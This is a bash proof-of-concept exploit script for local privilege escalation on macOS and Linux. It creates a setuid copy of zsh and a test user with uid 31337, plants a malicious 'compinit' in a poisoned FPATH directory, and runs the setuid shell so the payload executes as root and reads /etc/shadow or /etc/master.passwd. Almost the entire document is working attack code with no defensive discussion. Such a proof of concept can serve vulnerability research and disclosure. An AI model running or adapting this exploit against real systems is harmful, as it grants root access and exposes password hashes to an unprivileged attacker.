#!/bin/bash
# Minimal no-sudo RCE: FPATH poisoning on setuid zsh
# Unprivileged user (uid=31337) → root code execution (euid=0)
#
# Setup section creates a setuid zsh + test user (one-time, like a real system).
# The EXPLOIT section runs entirely as uid=31337 with NO sudo.
#
# Works on both macOS and Linux.
set -euo pipefail

ZSH_SRC="${1:-$(command -v zsh 2>/dev/null || echo /bin/zsh)}"
WORK=/tmp/rce_minimal_$$
OS="$(uname -s)"

cleanup() {
    if [ "$OS" = "Darwin" ]; then
        dscl . -delete /Users/attacker_user 2>/dev/null || true
    else
        userdel -rf attacker_user 2>/dev/null || true
    fi
    rm -rf "$WORK"
}
trap cleanup EXIT

mkdir -p "$WORK/evil_fpath" "$WORK/home"

# --- SETUP (simulates existing system config) ---
cp "$ZSH_SRC" "$WORK/suid_zsh"
chown root:wheel "$WORK/suid_zsh" 2>/dev/null || chown root:root "$WORK/suid_zsh"
chmod 4755 "$WORK/suid_zsh"

if [ "$OS" = "Darwin" ]; then
    dscl . -delete /Users/attacker_user 2>/dev/null || true
    dscl . -create /Users/attacker_user
    dscl . -create /Users/attacker_user UserShell /bin/bash
    dscl . -create /Users/attacker_user UniqueID 31337
    dscl . -create /Users/attacker_user PrimaryGroupID 31337
    dscl . -create /Users/attacker_user NFSHomeDirectory "$WORK/home"
    dscl . -create /Groups/attacker_user PrimaryGroupID 31337 2>/dev/null || true
else
    id attacker_user &>/dev/null && userdel -rf attacker_user 2>/dev/null
    useradd -u 31337 -d "$WORK/home" -s /bin/bash attacker_user
fi
chown 31337:31337 "$WORK/home" "$WORK/evil_fpath"

cat > "$WORK/evil_fpath/compinit" <<'PAYLOAD'
echo "=== FPATH RCE ACHIEVED ==="
echo "real_uid=$(id -ru) effective_uid=$(id -u)"
id
head -1 /etc/shadow 2>/dev/null && echo "ROOT CONFIRMED: /etc/shadow readable" || true
head -1 /etc/master.passwd 2>/dev/null && echo "ROOT CONFIRMED: /etc/master.passwd readable" || true
PAYLOAD
chmod 644 "$WORK/evil_fpath/compinit"

echo "suid zsh: $(ls -la "$WORK/suid_zsh")"
echo

# --- EXPLOIT (NO sudo, runs as uid=31337) ---
echo "--- EXPLOIT OUTPUT ---"
su attacker_user -s /bin/bash -c "
echo \"before: \$(id)\"
echo
export FPATH='$WORK/evil_fpath:/usr/share/zsh/functions'
export ZDOTDIR='$WORK/home' HOME='$WORK/home'
'$WORK/suid_zsh' -p -c 'autoload -Uz compinit; compinit'
"
